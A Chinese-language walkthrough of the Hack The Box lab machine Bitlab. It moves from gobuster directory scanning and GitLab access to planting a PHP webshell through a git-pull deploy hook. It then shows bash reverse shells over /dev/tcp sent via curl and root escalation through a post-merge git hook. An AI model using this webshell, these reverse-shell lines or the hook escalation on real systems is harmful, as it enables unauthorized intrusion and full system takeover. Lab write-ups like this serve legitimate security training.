### 目录探测

我们先从80下手，查看下网页内容![](../Images/3492a331913d8fc34b7b6a1f0d78eba4.png)先使用gobuster进行扫描

```
1.  `gobuster dir ‐u "http://10.10.10.114/" ‐w /usr/share/wordlists/dirbuster/directory‐list‐`
    
2.  `2.3‐medium.txt ‐t 150 ‐s 200,204,301,307,401,403 ‐o bitlab.gobuster`
    
```

**参数介绍：**

> dir: 表示扫描目录的模式 -w: 使用的字典 -t: 线程数量 -s: 只显示响应码为200,204,301,307,401,403的路径，因为我们访问网页的时候有些位置是不允许我们访问会被302跳转到登录界面

感觉是账号密码的感觉，我们在登录界面使用console进行尝试![](../Images/0fba26b360b7929fcec470b7f0da36eb.png)账号密码直接出现并成功登录登录后有2个库![](../Images/08adb3a040527c616b89c5b319a99d5d.png)在deployer中发现index.php，像是一个挂钩文件，当Profile存储库合并了一个新的提交时就会执行命令   切换到 profile目录 , 并且执行sudo git pull

```
1.  `<?php`
    
2.  `$input = file_get_contents("php://input");`
    
3.  `$payload  = json_decode($input);`
    
4.  `$repo = $payload‐>project‐>name ?? '';`
    
5.  `$event = $payload‐>event_type ?? '';`
    
6.  `$state = $payload‐>object_attributes‐>state ?? '';`
    
7.  `$branch = $payload‐>object_attributes‐>target_branch ?? '';`
    
8.  `if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged')`
    
9.  `{`
    
10.  `    echo shell_exec('cd ../profile/; sudo git pull'),"\n";`
     
11.  `}`
     
12.  `echo "OK\n";`
     
```

那么我们只要写入一个webshell并合并到profile库中，那么这个index.php就会把我们的webshell给pull下来我们创建一个分支![](../Images/eeafabe824c32c4759eb9cdc526ef26b.png)切换到这个分支，然后在这个分支上创建一个webshell![](../Images/bbcc8b75938839fc968073d245535251.png)![](../Images/cdc9a258ddaf1168e58aa621b2bba8c0.png)写入一个webshell，并提交![](../Images/dd45da35e905f9f2a81e6c6f50116c3c.png)

```
1.  `<?php`
    
2.  `if(isset($_REQUEST['cmd'])){`
    
3.  `        echo "<pre>";`
    
4.  `        $cmd = ($_REQUEST['cmd']);`
    
5.  `        system($cmd);`
    
6.  `        echo "</pre>";`
    
7.  `        die;`
    
8.  `}`
    
9.  `?>`
    
```

创建合并请求![](../Images/619a01c8fc5ec292b168b0a959fce99a.png)![](../Images/67e59bae434c4a95d0f0e00750f036dd.png)然后就可以看到我们的webshell就成功合并如mstaer库![](../Images/2cffe38f38e5bfec065ed37edc4f43a8.png)此时应该会被之前的挂钩文件pull到本地，我们尝试访问看看

```

```

也可以通过curl来进行命令执行![](../Images/cf7bec9b89f2dd95d7cf1b6fbc73544b.png)

```

```

> \-G：表示发送GET请求 --data--urlencode：对数据进行URL编码![](../Images/bd478570b6e24d7649e2dc673c1424b1.png)

这样我们就拿到了webshell  

### 反弹shell

接下来就是反弹shellkali先nc先监听端口![](../Images/5b961b5196dbbeaf7c6ba81a821f958e.png)然后用curl反弹，这里需要注意的是，反弹shell的指令前面还需要用到bash -c

```
1.  `curl ‐G "http://10.10.10.114/profile/dfz.php" ‐‐data‐urlencode "cmd=bash ‐c 'bash ‐i >&`
    
2.  `/dev/tcp/10.10.14.13/9001 0>&1'"`
    
```

![](../Images/a58f75aae9c314a6470525d2cee0cff8.png)反弹回来的shell，会出现字符错误，无法编辑vim等问题 输入下面的指令对反弹回来的shell进行设置，让后面我们可以正常使用

```
1.  `python ‐c "import pty;pty.spawn('/bin/bash')"`
    
2.  `ctrl + z (后台挂起shell)`
    
3.  `stty raw ‐echo`
    
4.  `fg + 多个回车   `
    
5.  `stty rows 34 cols 136`
    
6.  `export TERM=xterm`
    
```

![](../Images/f8b00f14ee23cb3f4ca28d390d1edcfd.png)这样我们反弹回来的shell就可以像我们平常用的那个shell一样了  

### 权限提升

进入之后我们看下sudo -l 有没有能突破的点![](../Images/529af8ccb864b8814ebc3f5f3fb822e9.png)这里我们可以看到 www-data用户可以不需要密码 以root的权限调用git pull 命令这里我们可以用git的hook文件来进行提权在.git/hooks文件中有一些模板，我们可以对照进行编写![](../Images/20dab9c5c1a7d5db735f1441c9a6f856.png)因为sudo运行www-data用户运行git pull文件那么我们找下运行这个命令的时候会触发哪个hook文件可以通过下面命令查看

```
1.  `man githooks`
    
```

![](../Images/aadcf8d30613fe9aa95d1cf59c7830e1.png)可以看到在执行git pull时，会触发post-merge这个文件但是在hook文件里面没有这个文件，我需要手动创建但是这个文件夹我们没有写的权限![](../Images/c89af13cdbad4aeaf075113aaa52b9c3.png)![](../Images/5ef2dbab43302d46e12c1fd4db365b19.png)那么我们把这个文件给重新拷贝一份出来![](../Images/9d20be90b48920b4f988a91317110597.png)然后在 `/tmp/dfz/profile/.git/hooks/`中创建一个 `post-merge`文件 ,并赋予执行权限

```
1.  `#!/bin/bash`
    
2.  `bash ‐c 'bash ‐i >& /dev/tcp/10.10.14.11/9000 0>&1'`
    
```

![](../Images/a8296b49ed1b296cbbedcbfafb91fbd4.png)那么我们接下来做的就是要触发git pull,在这之前我们需要在仓库里面添加一个新的文件，这样git pull才能有效果，否则就有如下的提示![](../Images/648f89ff1a8973e1b9faa14efc297fd7.png)我们可以直接添加一个文件并合并![](../Images/98cf07c26868c9645431a4e9e206a518.png)![](../Images/485dae2841c934d9a9ec508219ee3283.png)kali进行监听，然后再进行sudo git pull然后就得到root权限![](../Images/d6cc40831ca293ddb8cc5b0c086d8fc1.png)
